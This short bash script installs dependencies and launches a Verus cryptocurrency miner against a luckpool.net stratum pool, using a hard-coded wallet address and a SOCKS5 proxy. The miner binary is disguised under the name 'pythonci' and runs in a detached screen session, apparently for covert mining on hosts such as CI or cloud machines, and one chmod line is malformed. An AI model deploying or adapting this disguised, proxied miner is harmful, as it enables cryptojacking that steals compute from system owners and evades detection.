#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x yaat.sh && chmod +x pythonci chmod 777 pythonci yaat.sh
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
WR=$(echo $(shuf -i 1-1 -n 1)-VIA9)
PY=socks5://98.185.94.65:15608
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
